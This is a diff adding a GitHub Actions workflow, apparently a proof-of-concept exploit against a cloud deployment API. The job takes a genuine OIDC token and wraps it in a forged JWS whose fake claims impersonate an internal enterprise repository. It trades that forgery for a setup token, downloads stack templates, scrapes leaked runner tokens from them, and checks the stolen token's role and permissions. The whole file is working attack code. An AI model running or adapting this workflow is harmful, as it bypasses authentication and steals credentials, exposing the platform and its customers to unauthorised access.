@@ -1,0 +1,64 @@
+name: public-stack-template
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Inspect unauthenticated generated stack artifacts
+        shell: bash
+        run: |
+          set -euo pipefail
+          org='orgl9cvkaqh1g8yv2jqdb19247'
+          install='inlkuvvc4e3mdxznfis5xc6v60'
+          raw="$(curl -sSf "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https%3A%2F%2Fapi.byoc.lovable.net" -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}")"
+          export REAL_TOKEN="$(jq -r .value <<<"$raw")"
+          request="$(python3 - <<'PY'
+          import base64,json,os
+          h,p,s=os.environ['REAL_TOKEN'].split('.')
+          fake={'iss':'https://token.actions.githubusercontent.com','aud':'https://api.byoc.lovable.net','sub':'repo:lovablelabs/lovable-enterprise:ref:refs/heads/main','repository':'lovablelabs/lovable-enterprise','repository_id':'1287375944','repository_owner':'lovablelabs','repository_owner_id':'148472368','repository_visibility':'internal','ref':'refs/heads/main','ref_type':'branch','event_name':'push','workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main','job_workflow_ref':'lovablelabs/lovable-enterprise/.github/workflows/nuon-app-branches.yml@refs/heads/main'}
+          fp=base64.urlsafe_b64encode(json.dumps(fake,separators=(',',':')).encode()).decode().rstrip('=')
+          forged=json.dumps({'protected':h,'payload':p,'signature':s,'fake':'.'+fp+'.'},separators=(',',':'))
+          print(json.dumps({'org_id':'orgl9cvkaqh1g8yv2jqdb19247','token':forged},separators=(',',':')))
+          PY
+          )"
+          setup="$(curl -sSf 'https://api.byoc.lovable.net/v1/oidc/token' -H 'Content-Type: application/json' --data "$request")"
+          setup_token="$(jq -r .token <<<"$setup")"
+          public_objects=0
+          token_objects=0
+          leaked_token=''
+          leaked_install=''
+          leaked_version=''
+          stack="$(curl -sSf "https://api.byoc.lovable.net/v1/installs/$install/stack" -H "Authorization: Bearer $setup_token" -H "X-Nuon-Org-ID: $org")"
+          while IFS=$'\t' read -r version template; do
+              test -n "$template" || continue
+              code="$(curl -sS -L --max-redirs 0 -o /tmp/template -w '%{http_code}' "$template")"
+              test "$code" = 200 || continue
+              public_objects=$((public_objects+1))
+              candidate="$(python3 - <<'PY'
+          import re
+          b=open('/tmp/template','rb').read()
+          m=re.search(rb'tok[a-z0-9]{23}',b)
+          print(m.group().decode() if m else '')
+          PY
+              )"
+              if test -n "$candidate"; then
+                token_objects=$((token_objects+1))
+                if test -z "$leaked_token"; then
+                  leaked_token="$candidate"
+                  leaked_install="$install"
+                  leaked_version="$version"
+                fi
+              fi
+          done < <(jq -r '.versions[]? | [.id, (.template_url // "")] | @tsv' <<<"$stack")
+
+          if test -z "$leaked_token"; then
+            jq -n --argjson public_objects "$public_objects" --argjson token_objects "$token_objects" '{public_stack_objects:$public_objects,objects_with_runner_token:$token_objects}'
+            exit 2
+          fi
+
+          me="$(curl -sSf 'https://api.byoc.lovable.net/v1/auth/me' -H "Authorization: Bearer $leaked_token" -H "X-Nuon-Org-ID: $org")"
+          jq -n --argjson public_objects "$public_objects" --argjson token_objects "$token_objects" --arg leaked_install "$leaked_install" --arg leaked_version "$leaked_version" --arg account_type "$(jq -r .account_type <<<"$me")" --arg role "$(jq -r '.roles[0].role_type // ""' <<<"$me")" --arg permission "$(jq -r --arg org "$org" '.permissions[$org] // ""' <<<"$me")" '{public_stack_objects:$public_objects,objects_with_runner_token:$token_objects,source_install:$leaked_install,source_version:$leaked_version,token_account_type:$account_type,token_role:$role,token_permission:$permission}'
